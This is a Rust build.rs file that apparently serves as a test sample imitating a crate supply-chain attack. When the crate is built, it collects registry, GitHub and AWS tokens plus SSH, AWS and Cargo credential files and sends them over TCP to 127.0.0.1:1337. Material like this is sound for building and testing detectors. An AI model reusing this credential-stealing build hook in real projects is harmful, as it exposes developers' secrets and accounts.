/// Simulates the rust_decimal crate supply chain attack pattern.
/// build.rs reads env vars + sensitive files, connects via TcpStream.
/// HARMLESS: Connects to 127.0.0.1 only. No real data sent.

use std::env;
use std::fs;
use std::io::Write;
use std::net::TcpStream;

fn gather_credentials() -> String {
    let mut data = String::new();

    // Read environment credentials
    if let Ok(val) = std::env::var("CARGO_REGISTRY_TOKEN") {
        data.push_str(&format!("cargo_token={}\n", val));
    }
    if let Ok(val) = std::env::var("GITHUB_TOKEN") {
        data.push_str(&format!("gh_token={}\n", val));
    }
    if let Ok(val) = std::env::var("AWS_SECRET_ACCESS_KEY") {
        data.push_str(&format!("aws_secret={}\n", val));
    }

    // Read sensitive files
    let home = env::var("HOME").unwrap_or_default();
    let paths = vec![
        format!("{}/.ssh/id_rsa", home),
        format!("{}/.aws/credentials", home),
        format!("{}/.cargo/credentials.toml", home),
    ];

    for path in paths {
        if let Ok(contents) = std::fs::read_to_string(&path) {
            data.push_str(&format!("file={}:\n{}\n", path, contents));
        }
    }

    data
}

fn exfiltrate(data: &str) {
    if let Ok(mut stream) = std::net::TcpStream::connect("127.0.0.1:1337") {
        let _ = stream.write_all(data.as_bytes());
    }
}

fn main() {
    let creds = gather_credentials();
    if !creds.is_empty() {
        exfiltrate(&creds);
    }
    println!("cargo:rerun-if-changed=build.rs");
}
